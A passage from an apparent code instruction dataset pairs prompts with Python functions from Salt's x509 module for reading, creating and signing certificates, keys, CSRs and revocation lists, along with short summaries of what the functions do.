 for ext_index in range(0, cert.get_ext_count()):\n        ext = cert.get_ext_at(ext_index)\n        name = ext.get_name()\n        val = ext.get_value()\n        if ext.get_critical():\n            val = 'critical ' + val\n        exts[name] = val\n\n    if exts:\n        ret['X509v3 Extensions'] = exts\n\n    return ret", "response": "Read a certificate file and return a dict containing details of the certificate."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_certificates(glob_path):\n    '''\n    Returns a dict containing details of a all certificates matching a glob\n\n    glob_path:\n        A path to certificates to be read and returned.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.read_certificates \"/etc/pki/*.crt\"\n    '''\n    ret = {}\n\n    for path in glob.glob(glob_path):\n        if os.path.isfile(path):\n            try:\n                ret[path] = read_certificate(certificate=path)\n            except ValueError as err:\n                log.debug('Unable to read certificate %s: %s', path, err)\n\n    return ret", "response": "Reads all certificates matching a glob_path and returns a dict containing details of a all certificates matching a glob_path"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a dict containing details of a certificate request.", "response": "def read_csr(csr):\n    '''\n    Returns a dict containing details of a certificate request.\n\n    :depends:   - OpenSSL command line tool\n\n    csr:\n        A path or PEM encoded string containing the CSR to read.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.read_csr /etc/pki/mycert.csr\n    '''\n    csr = _get_request_obj(csr)\n    ret = {\n        # X509 Version 3 has a value of 2 in the field.\n        # Version 2 has a value of 1.\n        # https://tools.ietf.org/html/rfc5280#section-4.1.2.1\n        'Version': csr.get_version() + 1,\n        # Get size returns in bytes. The world thinks of key sizes in bits.\n        'Subject': _parse_subject(csr.get_subject()),\n        'Subject Hash': _dec2hex(csr.get_subject().as_hash()),\n        'Public Key Hash': hashlib.sha1(csr.get_pubkey().get_modulus()).hexdigest(),\n        'X509v3 Extensions': _get_csr_extensions(csr),\n    }\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread a PEM encoded X509 CRL and returns a dict containing details of a certificate revocation list.", "response": "def read_crl(crl):\n    '''\n    Returns a dict containing details of a certificate revocation list.\n    Input can be a PEM string or file path.\n\n    :depends:   - OpenSSL command line tool\n\n    csl:\n        A path or PEM encoded string containing the CSL to read.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.read_crl /etc/pki/mycrl.crl\n    '''\n    text = _text_or_file(crl)\n    text = get_pem_entry(text, pem_type='X509 CRL')\n\n    crltempfile = tempfile.NamedTemporaryFile()\n    crltempfile.write(salt.utils.stringutils.to_str(text))\n    crltempfile.flush()\n    crlparsed = _parse_openssl_crl(crltempfile.name)\n    crltempfile.close()\n\n    return crlparsed"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a string containing the public key in PEM format.", "response": "def get_public_key(key, passphrase=None, asObj=False):\n    '''\n    Returns a string containing the public key in PEM format.\n\n    key:\n        A path or PEM encoded string containing a CSR, Certificate or\n        Private Key from which a public key can be retrieved.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.get_public_key /etc/pki/mycert.cer\n    '''\n\n    if isinstance(key, M2Crypto.X509.X509):\n        rsa = key.get_pubkey().get_rsa()\n        text = b''\n    else:\n        text = _text_or_file(key)\n        text = get_pem_entry(text)\n\n    if text.startswith(b'-----BEGIN PUBLIC KEY-----'):\n        if not asObj:\n            return text\n        bio = M2Crypto.BIO.MemoryBuffer()\n        bio.write(text)\n        rsa = M2Crypto.RSA.load_pub_key_bio(bio)\n\n    bio = M2Crypto.BIO.MemoryBuffer()\n    if text.startswith(b'-----BEGIN CERTIFICATE-----'):\n        cert = M2Crypto.X509.load_cert_string(text)\n        rsa = cert.get_pubkey().get_rsa()\n    if text.startswith(b'-----BEGIN CERTIFICATE REQUEST-----'):\n        csr = M2Crypto.X509.load_request_string(text)\n        rsa = csr.get_pubkey().get_rsa()\n    if (text.startswith(b'-----BEGIN PRIVATE KEY-----') or\n            text.startswith(b'-----BEGIN RSA PRIVATE KEY-----')):\n        rsa = M2Crypto.RSA.load_key_string(\n            text, callback=_passphrase_callback(passphrase))\n\n    if asObj:\n        evppubkey = M2Crypto.EVP.PKey()\n        evppubkey.assign_rsa(rsa)\n        return evppubkey\n\n    rsa.save_pub_key_bio(bio)\n    return bio.read_all()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef write_pem(text, path, overwrite=True, pem_type=None):\n    '''\n    Writes out a PEM string fixing any formatting or whitespace\n    issues before writing.\n\n    text:\n        PEM string input to be written out.\n\n    path:\n        Path of the file to write the pem out to.\n\n    overwrite:\n        If True(default), write_pem will overwrite the entire pem file.\n        Set False to preserve existing private keys and dh params that may\n        exist in the pem file.\n\n    pem_type:\n        The PEM type to be saved, for example ``CERTIFICATE`` or\n        ``PUBLIC KEY``. Adding this will allow the function to take\n        input that may contain multiple pem types.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.write_pem \"-----BEGIN CERTIFICATE-----MIIGMzCCBBugA...\" path=/etc/pki/mycert.crt\n    '''\n    with salt.utils.files.set_umask(0o077):\n        text = get_pem_entry(text, pem_type=pem_type)\n        _dhparams = ''\n        _private_key = ''\n        if pem_type and pem_type == 'CERTIFICATE' and os.path.isfile(path) and not overwrite:\n            _filecontents = _text_or_file(path)\n            try:\n                _dhparams = get_pem_entry(_filecontents, 'DH PARAMETERS')\n            except salt.exceptions.SaltInvocationError as err:\n                log.debug(\"Error when getting DH PARAMETERS: %s\", err)\n                log.trace(err, exc_info=err)\n            try:\n                _private_key = get_pem_entry(_filecontents, '(?:RSA )?PRIVATE KEY')\n            except salt.exceptions.SaltInvocationError as err:\n                log.debug(\"Error when getting PRIVATE KEY: %s\", err)\n                log.trace(err, exc_info=err)\n        with salt.utils.files.fopen(path, 'w') as _fp:\n            if pem_type and pem_type == 'CERTIFICATE' and _private_key:\n                _fp.write(salt.utils.stringutils.to_str(_private_key))\n            _fp.write(salt.utils.stringutils.to_str(text))\n            if pem_type and pem_type == 'CERTIFICATE' and _dhparams:\n                _fp.write(salt.utils.stringutils.to_str(_dhparams))\n    return 'PEM written to {0}'.format(path)", "response": "Writes out a PEM string to a file."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_private_key(path=None,\n                       text=False,\n                       bits=2048,\n                       passphrase=None,\n                       cipher='aes_128_cbc',\n                       verbose=True):\n    '''\n    Creates a private key in PEM format.\n\n    path:\n        The path to write the file to, either ``path`` or ``text``\n        are required.\n\n    text:\n        If ``True``, return the PEM text without writing to a file.\n        Default ``False``.\n\n    bits:\n        Length of the private key in bits. Default 2048\n\n    passphrase:\n        Passphrase for encryting the private key\n\n    cipher:\n        Cipher for encrypting the private key. Has no effect if passhprase is None.\n\n    verbose:\n        Provide visual feedback on stdout. Default True\n\n        .. versionadded:: 2016.11.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.create_private_key path=/etc/pki/mykey.key\n    '''\n    if not path and not text:\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified.')\n    if path and text:\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified, not both.')\n\n    if verbose:\n        _callback_func = M2Crypto.RSA.keygen_callback\n    else:\n        _callback_func = _keygen_callback\n\n    # pylint: disable=no-member\n    rsa = M2Crypto.RSA.gen_key(bits, M2Crypto.m2.RSA_F4, _callback_func)\n    # pylint: enable=no-member\n    bio = M2Crypto.BIO.MemoryBuffer()\n    if passphrase is None:\n        cipher = None\n    rsa.save_key_bio(\n        bio,\n        cipher=cipher,\n        callback=_passphrase_callback(passphrase))\n\n    if path:\n        return write_pem(\n            text=bio.read_all(),\n            path=path,\n            pem_type='(?:RSA )?PRIVATE KEY'\n        )\n    else:\n        return salt.utils.stringutils.to_str(bio.read_all())", "response": "Create a private key in PEM format."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a CRL for the given key - set of certificates.", "response": "def create_crl(  # pylint: disable=too-many-arguments,too-many-locals\n        path=None, text=False, signing_private_key=None,\n        signing_private_key_passphrase=None,\n        signing_cert=None, revoked=None, include_expired=False,\n        days_valid=100, digest=''):\n    '''\n    Create a CRL\n\n    :depends:   - PyOpenSSL Python module\n\n    path:\n        Path to write the crl to.\n\n    text:\n        If ``True``, return the PEM text without writing to a file.\n        Default ``False``.\n\n    signing_private_key:\n        A path or string of the private key in PEM format that will be used\n        to sign this crl. This is required.\n\n    signing_private_key_passphrase:\n        Passphrase to decrypt the private key.\n\n    signing_cert:\n        A certificate matching the private key that will be used to sign\n        this crl. This is required.\n\n    revoked:\n        A list of dicts containing all the certificates to revoke. Each dict\n        represents one certificate. A dict must contain either the key\n        ``serial_number`` with the value of the serial number to revoke, or\n        ``certificate`` with either the PEM encoded text of the certificate,\n        or a path to the certificate to revoke.\n\n        The dict can optionally contain the ``revocation_date`` key. If this\n        key is omitted the revocation date will be set to now. If should be a\n        string in the format \"%Y-%m-%d %H:%M:%S\".\n\n        The dict can also optionally contain the ``not_after`` key. This is\n        redundant if the ``certificate`` key is included. If the\n        ``Certificate`` key is not included, this can be used for the logic\n        behind the ``include_expired`` parameter. If should be a string in\n        the format \"%Y-%m-%d %H:%M:%S\".\n\n        The dict can also optionally contain the ``reason`` key. This is the\n        reason code for the revocation. Available choices are ``unspecified``,\n        ``keyCompromise``, ``CACompromise``, ``affiliationChanged``,\n        ``superseded``, ``cessationOfOperation`` and ``certificateHold``.\n\n    include_expired:\n        Include expired certificates in the CRL. Default is ``False``.\n\n    days_valid:\n        The number of days that the CRL should be valid. This sets the Next\n        Update field in the CRL.\n\n    digest:\n        The digest to use for signing the CRL.\n        This has no effect on versions of pyOpenSSL less than 0.14\n\n    .. note\n\n        At this time the pyOpenSSL library does not allow choosing a signing\n        algorithm for CRLs See https://github.com/pyca/pyopenssl/issues/159\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.create_crl path=/etc/pki/mykey.key signing_private_key=/etc/pki/ca.key signing_cert=/etc/pki/ca.crt revoked=\"{'compromized-web-key': {'certificate': '/etc/pki/certs/www1.crt', 'revocation_date': '2015-03-01 00:00:00'}}\"\n    '''\n    # pyOpenSSL is required for dealing with CSLs. Importing inside these\n    # functions because Client operations like creating CRLs shouldn't require\n    # pyOpenSSL Note due to current limitations in pyOpenSSL it is impossible\n    # to specify a digest For signing the CRL. This will hopefully be fixed\n    # soon: https://github.com/pyca/pyopenssl/pull/161\n    if OpenSSL is None:\n        raise salt.exceptions.SaltInvocationError(\n            'Could not load OpenSSL module, OpenSSL unavailable'\n        )\n    crl = OpenSSL.crypto.CRL()\n\n    if revoked is None:\n        revoked = []\n\n    for rev_item in revoked:\n        if 'certificate' in rev_item:\n            rev_cert = read_certificate(rev_item['certificate'])\n            rev_item['serial_number'] = rev_cert['Serial Number']\n            rev_item['not_after'] = rev_cert['Not After']\n\n        serial_number = rev_item['serial_number'].replace(':', '')\n        # OpenSSL bindings requires this to be a non-unicode string\n        serial_number = salt.utils.stringutils.to_bytes(serial_number)\n\n        if 'not_after' in rev_item and not include_expired:\n            not_after = datetime.datetime.strptime(\n                rev_item['not_after'], '%Y-%m-%d %H:%M:%S')\n            if datetime.datetime.now() > not_after:\n                continue\n\n        if 'revocation_date' not in rev_item:\n            rev_item['revocation_date'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n\n        rev_date = datetime.datetime.strptime(\n            rev_item['revocation_date'], '%Y-%m-%d %H:%M:%S')\n        rev_date = rev_date.strftime('%Y%m%d%H%M%SZ')\n        rev_date = salt.utils.stringutils.to_bytes(rev_date)\n\n        rev = OpenSSL.crypto.Revoked()\n        rev.set_serial(salt.utils.stringutils.to_bytes(serial_number))\n        rev.set_rev_date(salt.utils.stringutils.to_bytes(rev_date))\n\n        if 'reason' in rev_item:\n            # Same here for OpenSSL bindings and non-unicode strings\n            reason = salt.utils.stringutils.to_str(rev_item['reason'])\n            rev.set_reason(reason)\n\n        crl.add_revoked(rev)\n\n    signing_cert = _text_or_file(signing_cert)\n    cert = OpenSSL.crypto.load_certificate(\n        OpenSSL.crypto.FILETYPE_PEM,\n        get_pem_entry(signing_cert, pem_type='CERTIFICATE'))\n    signing_private_key = _get_private_key_obj(signing_private_key,\n                                               passphrase=signing_private_key_passphrase).as_pem(cipher=None)\n    key = OpenSSL.crypto.load_privatekey(\n        OpenSSL.crypto.FILETYPE_PEM,\n        get_pem_entry(signing_private_key))\n\n    export_kwargs = {\n        'cert': cert,\n        'key': key,\n        'type': OpenSSL.crypto.FILETYPE_PEM,\n        'days': days_valid\n    }\n    if digest:\n        export_kwargs['digest'] = salt.utils.stringutils.to_bytes(digest)\n    else:\n        log.warning('No digest specified. The default md5 digest will be used.')\n\n    try:\n        crltext = crl.export(**export_kwargs)\n    except (TypeError, ValueError):\n        log.warning('Error signing crl with specified digest. '\n                    'Are you using pyopenssl 0.15 or newer? '\n                    'The default md5 digest will be used.')\n        export_kwargs.pop('digest', None)\n        crltext = crl.export(**export_kwargs)\n\n    if text:\n        return crltext\n\n    return write_pem(text=crltext, path=path, pem_type='X509 CRL')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrequests a certificate to be remotely signed according to a signing policy. argdic: A dict containing all the arguments to be passed into the create_certificate function. This will become kwargs when passed to create_certificate. kwargs: kwargs delivered from publish.publish CLI Example: .. code-block:: bash salt '*' x509.sign_remote_certificate argdic=\"{'public_key': '/etc/pki/www.key', 'signing_policy': 'www'}\" __pub_id='www1'", "response": "def sign_remote_certificate(argdic, **kwargs):\n    '''\n    Request a certificate to be remotely signed according to a signing policy.\n\n    argdic:\n        A dict containing all the arguments to be passed into the\n        create_certificate function. This will become kwargs when passed\n        to create_certificate.\n\n    kwargs:\n        kwargs delivered from publish.publish\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.sign_remote_certificate argdic=\"{'public_key': '/etc/pki/www.key', 'signing_policy': 'www'}\" __pub_id='www1'\n    '''\n    if 'signing_policy' not in argdic:\n        return 'signing_policy must be specified'\n\n    if not isinstance(argdic, dict):\n        argdic = ast.literal_eval(argdic)\n\n    signing_policy = {}\n    if 'signing_policy' in argdic:\n        signing_policy = _get_signing_policy(argdic['signing_policy'])\n        if not signing_policy:\n            return 'Signing policy {0} does not exist.'.format(argdic['signing_policy'])\n\n        if isinstance(signing_policy, list):\n            dict_ = {}\n            for item in signing_policy:\n                dict_.update(item)\n            signing_policy = dict_\n\n    if 'minions' in signing_policy:\n        if '__pub_id' not in kwargs:\n            return 'minion sending this request could not be identified'\n        matcher = 'match.glob'\n        if '@' in signing_policy['minions']:\n            matcher = 'match.compound'\n        if not __salt__[matcher](\n                signing_policy['minions'], kwargs['__pub_id']):\n            return '{0} not permitted to use signing policy {1}'.format(\n                kwargs['__pub_id'], argdic['signing_policy'])\n\n    try:\n        return create_certificate(path=None, text=True, **argdic)\n    except Exception as except_:  # pylint: disable=broad-except\n        return six.text_type(except_)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the details of a names signing policy. Does not return the private key.", "response": "def get_signing_policy(signing_policy_name):\n    '''\n    Returns the details of a names signing policy, including the text of\n    the public key that will be used to sign it. Does not return the\n    private key.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.get_signing_policy www\n    '''\n    signing_policy = _get_signing_policy(signing_policy_name)\n    if not signing_policy:\n        return 'Signing policy {0} does not exist.'.format(signing_policy_name)\n\n    if isinstance(signing_policy, list):\n        dict_ = {}\n        for item in signing_policy:\n            dict_.update(item)\n        signing_policy = dict_\n\n    try:\n        del signing_policy['signing_private_key']\n    except KeyError:\n        pass\n\n    try:\n        signing_policy['signing_cert'] = get_pem_entry(signing_policy['signing_cert'], 'CERTIFICATE')\n    except KeyError:\n        log.debug('Unable to get \"certificate\" PEM entry')\n\n    return signing_policy"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_certificate(\n        path=None, text=False, overwrite=True, ca_server=None, **kwargs):\n    '''\n    Create an X509 certificate.\n\n    path:\n        Path to write the certificate to.\n\n    text:\n        If ``True``, return the PEM text without writing to a file.\n        Default ``False``.\n\n    overwrite:\n        If True(default), create_certificate will overwrite the entire pem\n        file. Set False to preserve existing private keys and dh params that\n        may exist in the pem file.\n\n    kwargs:\n        Any of the properties below can be included as additional\n        keyword arguments.\n\n    ca_server:\n        Request a remotely signed certificate from ca_server. For this to\n        work, a ``signing_policy`` must be specified, and that same policy\n        must be configured on the ca_server (name or list of ca server). See ``signing_policy`` for\n        details. Also the salt master must permit peers to call the\n        ``sign_remote_certificate`` function.\n\n        Example:\n\n        /etc/salt/master.d/peer.conf\n\n        .. code-block:: yaml\n\n            peer:\n              .*:\n                - x509.sign_remote_certificate\n\n    subject properties:\n        Any of the values below can be included to set subject properties\n        Any other subject properties supported by OpenSSL should also work.\n\n        C:\n            2 letter Country code\n        CN:\n            Certificate common name, typically the FQDN.\n\n        Email:\n            Email address\n\n        GN:\n            Given Name\n\n        L:\n            Locality\n\n        O:\n            Organization\n\n        OU:\n            Organization Unit\n\n        SN:\n            SurName\n\n        ST:\n            State or Province\n\n    signing_private_key:\n        A path or string of the private key in PEM format that will be used\n        to sign this certificate. If neither ``signing_cert``, ``public_key``,\n        or ``csr`` are included, it will be assumed that this is a self-signed\n        certificate, and the public key matching ``signing_private_key`` will\n        be used to create the certificate.\n\n    signing_private_key_passphrase:\n        Passphrase used to decrypt the signing_private_key.\n\n    signing_cert:\n        A certificate matching the private key that will be used to sign this\n        certificate. This is used to populate the issuer values in the\n        resulting certificate. Do not include this value for\n        self-signed certificates.\n\n    public_key:\n        The public key to be included in this certificate. This can be sourced\n        from a public key, certificate, csr or private key. If a private key\n        is used, the matching public key from the private key will be\n        generated before any processing is done. This means you can request a\n        certificate from a remote CA using a private key file as your\n        public_key and only the public key will be sent across the network to\n        the CA. If neither ``public_key`` or ``csr`` are specified, it will be\n        assumed that this is a self-signed certificate, and the public key\n        derived from ``signing_private_key`` will be used. Specify either\n        ``public_key`` or ``csr``, not both. Because you can input a CSR as a\n        public key or as a CSR, it is important to understand the difference.\n        If you import a CSR as a public key, only the public key will be added\n        to the certificate, subject or extension information in the CSR will\n        be lost.\n\n    public_key_passphrase:\n        If the public key is supplied as a private key, this is the passphrase\n        used to decrypt it.\n\n    csr:\n        A file or PEM string containing a certificate signing request. This\n        will be used to supply the subject, extensions and public key of a\n        certificate. Any subject or extensions specified explicitly will\n        overwrite any in the CSR.\n\n    basicConstraints:\n        X509v3 Basic Constraints extension.\n\n    extensions:\n        The following arguments set X509v3 Extension values. If the value\n        starts with ``critical``, the extension will be marked as critical.\n\n        Some special extensions are ``subjectKeyIdentifier`` and\n        ``authorityKeyIdentifier``.\n\n        ``subjectKeyIdentifier`` can be an explicit value or it can be the\n        special string ``hash``. ``hash`` will set the subjectKeyIdentifier\n        equal to the SHA1 hash of the modulus of the public key in this\n        certificate. Note that this is not the exact same hashing method used\n        by OpenSSL when using the hash value.\n\n        ``authorityKeyIdentifier`` Use values acceptable to the openssl CLI\n        tools. This will automatically populate ``authorityKeyIdentifier``\n        with the ``subjectKeyIdentifier`` of ``signing_cert``. If this is a\n        self-signed cert these values will be the same.\n\n        basicConstraints:\n            X509v3 Basic Constraints\n\n        keyUsage:\n            X509v3 Key Usage\n\n        extendedKeyUsage:\n            X509v3 Extended Key Usage\n\n        subjectKeyIdentifier:\n            X509v3 Subject Key Identifier\n\n        issuerAltName:\n            X509v3 Issuer Alternative Name\n\n        subjectAltName:\n            X509v3 Subject Alternative Name\n\n        crlDistributionPoints:\n            X509v3 CRL distribution points\n\n        issuingDistributionPoint:\n            X509v3 Issuing Distribution Point\n\n        certificatePolicies:\n            X509v3 Certificate Policies\n\n        policyConstraints:\n            X509v3 Policy Constraints\n\n        inhibitAnyPolicy:\n            X509v3 Inhibit Any Policy\n\n        nameConstraints:\n            X509v3 Name Constraints\n\n        noCheck:\n            X509v3 OCSP No Check\n\n        nsComment:\n            Netscape Comment\n\n        nsCertType:\n            Netscape Certificate Type\n\n    days_valid:\n        The number of days this certificate should be valid. This sets the\n        ``notAfter`` property of the certificate. Defaults to 365.\n\n    version:\n        The version of the X509 certificate. Defaults to 3. This is\n        automatically converted to the version value, so ``version=3``\n        sets the certificate version field to 0x2.\n\n    serial_number:\n        The serial number to assign to this certificate. If omitted a random\n        serial number of size ``serial_bits`` is generated.\n\n    serial_bits:\n        The number of bits to use when randomly generating a serial number.\n        Defaults to 64.\n\n    algorithm:\n        The hashing algorithm to be used for signing this certificate.\n        Defaults to sha256.\n\n    copypath:\n        An additional path to copy the resulting certificate to. Can be used\n        to maintain a copy of all certificates issued for revocation purposes.\n\n    prepend_cn:\n        If set to True, the CN and a dash will be prepended to the copypath's filename.\n\n        Example:\n            /etc/pki/issued_certs/www.example.com-DE:CA:FB:AD:00:00:00:00.crt\n\n    signing_policy:\n        A signing policy that should be used to create this certificate.\n        Signing policies should be defined in the minion configuration, or in\n        a minion pillar. It should be a yaml formatted list of arguments\n        which will override any arguments passed to this function. If the\n        ``minions`` key is included in the signing policy, only minions\n        matching that pattern (see match.glob and match.compound) will be\n        permitted to remotely request certificates from that policy.\n\n        Example:\n\n        .. code-block:: yaml\n\n            x509_signing_policies:\n              www:\n                - minions: 'www*'\n                - signing_private_key: /etc/pki/ca.key\n                - signing_cert: /etc/pki/ca.crt\n                - C: US\n                - ST: Utah\n                - L: Salt Lake City\n                - basicConstraints: \"critical CA:false\"\n                - keyUsage: \"critical cRLSign, keyCertSign\"\n                - subjectKeyIdentifier: hash\n                - authorityKeyIdentifier: keyid,issuer:always\n                - days_valid: 90\n                - copypath: /etc/pki/issued_certs/\n\n        The above signing policy can be invoked with ``signing_policy=www``\n\n    ext_mapping:\n        Provide additional X509v3 extension mappings.  This argument should be\n        in the form of a dictionary and should include both the OID and the\n        friendly name for the extension.\n\n        .. versionadded:: Neon\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.create_certificate path=/etc/pki/myca.crt signing_private_key='/etc/pki/myca.key' csr='/etc/pki/myca.csr'}\n    '''\n\n    if not path and not text and ('testrun' not in kwargs or kwargs['testrun'] is False):\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified.')\n    if path and text:\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified, not both.')\n\n    if 'public_key_passphrase' not in kwargs:\n        kwargs['public_key_passphrase'] = None\n    if ca_server:\n        if 'signing_policy' not in kwargs:\n            raise salt.exceptions.SaltInvocationError(\n                'signing_policy must be specified'\n                'if requesting remote certificate from ca_server {0}.'\n                .format(ca_server))\n        if 'csr' in kwargs:\n            kwargs['csr'] = get_pem_entry(\n                kwargs['csr'],\n                pem_type='CERTIFICATE REQUEST').replace('\\n', '')\n        if 'public_key' in kwargs:\n            # Strip newlines to make passing through as cli functions easier\n            kwargs['public_key'] = salt.utils.stringutils.to_str(get_public_key(\n                kwargs['public_key'],\n                passphrase=kwargs['public_key_passphrase'])).replace('\\n', '')\n\n        # Remove system entries in kwargs\n        # Including listen_in and preqreuired because they are not included\n        # in STATE_INTERNAL_KEYWORDS\n        # for salt 2014.7.2\n        for ignore in list(_STATE_INTERNAL_KEYWORDS) + ['listen_in', 'preqrequired', '__prerequired__']:\n            kwargs.pop(ignore, None)\n\n        if not isinstance(ca_server, list):\n            ca_server = [ca_server]\n        random.shuffle(ca_server)\n        for server in ca_server:\n            certs = __salt__['publish.publish'](\n                tgt=server,\n                fun='x509.sign_remote_certificate',\n                arg=six.text_type(kwargs))\n            if certs is None or not any(certs):\n                continue\n            else:\n                cert_txt = certs[server]\n                break\n\n        if not any(certs):\n            raise salt.exceptions.SaltInvocationError(\n                    'ca_server did not respond'\n                    ' salt master must permit peers to'\n                    ' call the sign_remote_certificate function.')\n\n        if path:\n            return write_pem(\n                text=cert_txt,\n                overwrite=overwrite,\n                path=path,\n                pem_type='CERTIFICATE'\n            )\n        else:\n            return cert_txt\n\n    signing_policy = {}\n    if 'signing_policy' in kwargs:\n        signing_policy = _get_signing_policy(kwargs['signing_policy'])\n        if isinstance(signing_policy, list):\n            dict_ = {}\n            for item in signing_policy:\n                dict_.update(item)\n            signing_policy = dict_\n\n    # Overwrite any arguments in kwargs with signing_policy\n    kwargs.update(signing_policy)\n\n    for prop, default in six.iteritems(CERT_DEFAULTS):\n        if prop not in kwargs:\n            kwargs[prop] = default\n\n    cert = M2Crypto.X509.X509()\n\n    # X509 Version 3 has a value of 2 in the field.\n    # Version 2 has a value of 1.\n    # https://tools.ietf.org/html/rfc5280#section-4.1.2.1\n    cert.set_version(kwargs['version'] - 1)\n\n    # Random serial number if not specified\n    if 'serial_number' not in kwargs:\n        kwargs['serial_number'] = _dec2hex(\n            random.getrandbits(kwargs['serial_bits']))\n    serial_number = int(kwargs['serial_number'].replace(':', ''), 16)\n    # With Python3 we occasionally end up with an INT that is greater than a C\n    # long max_value. This causes an overflow error due to a bug in M2Crypto.\n    # See issue: https://gitlab.com/m2crypto/m2crypto/issues/232\n    # Remove this after M2Crypto fixes the bug.\n    if six.PY3:\n        if salt.utils.platform.is_windows():\n            INT_MAX = 2147483647\n            if serial_number >= INT_MAX:\n                serial_number -= int(serial_number / INT_MAX) * INT_MAX\n        else:\n            if serial_number >= sys.maxsize:\n                serial_number -= int(serial_number / sys.maxsize) * sys.maxsize\n    cert.set_serial_number(serial_number)\n\n    # Set validity dates\n    # pylint: disable=no-member\n    not_before = M2Crypto.m2.x509_get_not_before(cert.x509)\n    not_after = M2Crypto.m2.x509_get_not_after(cert.x509)\n    M2Crypto.m2.x509_gmtime_adj(not_before, 0)\n    M2Crypto.m2.x509_gmtime_adj(not_after, 60 * 60 * 24 * kwargs['days_valid'])\n    # pylint: enable=no-member\n\n    # If neither public_key or csr are included, this cert is self-signed\n    if 'public_key' not in kwargs and 'csr' not in kwargs:\n        kwargs['public_key'] = kwargs['signing_private_key']\n        if 'signing_private_key_passphrase' in kwargs:\n            kwargs['public_key_passphrase'] = kwargs[\n                'signing_private_key_passphrase']\n\n    csrexts = {}\n    if 'csr' in kwargs:\n        kwargs['public_key'] = kwargs['csr']\n        csr = _get_request_obj(kwargs['csr'])\n        cert.set_subject(csr.get_subject())\n        csrexts = read_csr(kwargs['csr'])['X509v3 Extensions']\n\n    cert.set_pubkey(get_public_key(kwargs['public_key'],\n                                   passphrase=kwargs['public_key_passphrase'], asObj=True))\n\n    subject = cert.get_subject()\n\n    # pylint: disable=unused-variable\n    for entry, num in six.iteritems(subject.nid):\n        if entry in kwargs:\n            setattr(subject, entry, kwargs[entry])\n    # pylint: enable=unused-variable\n\n    if 'signing_cert' in kwargs:\n        signing_cert = _get_certificate_obj(kwargs['signing_cert'])\n    else:\n        signing_cert = cert\n    cert.set_issuer(signing_cert.get_subject())\n\n    if 'ext_mapping' in kwargs:\n        EXT_NAME_MAPPINGS.update(kwargs['ext_mapping'])\n\n    for extname, extlongname in six.iteritems(EXT_NAME_MAPPINGS):\n        if (extname in kwargs or extlongname in kwargs or\n                extname in csrexts or extlongname in csrexts) is False:\n            continue\n\n        # Use explicitly set values first, fall back to CSR values.\n        extval = kwargs.get(extname) or kwargs.get(extlongname) or csrexts.get(extname) or csrexts.get(extlongname)\n\n        critical = False\n        if extval.startswith('critical '):\n            critical = True\n            extval = extval[9:]\n\n        if extname == 'subjectKeyIdentifier' and 'hash' in extval:\n            extval = extval.replace('hash', _get_pubkey_hash(cert))\n\n        issuer = None\n        if extname == 'authorityKeyIdentifier':\n            issuer = signing_cert\n\n        if extname == 'subjectAltName':\n            extval = extval.replace('IP Address', 'IP')\n\n        ext = _new_extension(\n            name=extname, value=extval, critical=critical, issuer=issuer)\n        if not ext.x509_ext:\n            log.info('Invalid X509v3 Extension. %s: %s', extname, extval)\n            continue\n\n        cert.add_ext(ext)\n\n    if 'signing_private_key_passphrase' not in kwargs:\n        kwargs['signing_private_key_passphrase'] = None\n    if 'testrun' in kwargs and kwargs['testrun'] is True:\n        cert_props = read_certificate(cert)\n        cert_props['Issuer Public Key'] = get_public_key(\n            kwargs['signing_private_key'],\n            passphrase=kwargs['signing_private_key_passphrase'])\n        return cert_props\n\n    if not verify_private_key(private_key=kwargs['signing_private_key'],\n                              passphrase=kwargs[\n                                  'signing_private_key_passphrase'],\n                              public_key=signing_cert):\n        raise salt.exceptions.SaltInvocationError(\n            'signing_private_key: {0} '\n            'does no match signing_cert: {1}'.format(\n                kwargs['signing_private_key'],\n                kwargs.get('signing_cert', '')\n            )\n        )\n\n    cert.sign(\n        _get_private_key_obj(kwargs['signing_private_key'],\n                             passphrase=kwargs['signing_private_key_passphrase']),\n        kwargs['algorithm']\n    )\n\n    if not verify_signature(cert, signing_pub_key=signing_cert):\n        raise salt.exceptions.SaltInvocationError(\n            'failed to verify certificate signature')\n\n    if 'copypath' in kwargs:\n        if 'prepend_cn' in kwargs and kwargs['prepend_cn'] is True:\n            prepend = six.text_type(kwargs['CN']) + '-'\n        else:\n            prepend = ''\n        write_pem(text=cert.as_pem(), path=os.path.join(kwargs['copypath'],\n                                                        prepend + kwargs['serial_number'] + '.crt'),\n                  pem_type='CERTIFICATE')\n\n    if path:\n        return write_pem(\n            text=cert.as_pem(),\n            overwrite=overwrite,\n            path=path,\n            pem_type='CERTIFICATE'\n        )\n    else:\n        return salt.utils.stringutils.to_str(cert.as_pem())", "response": "Create a new X509 certificate."}
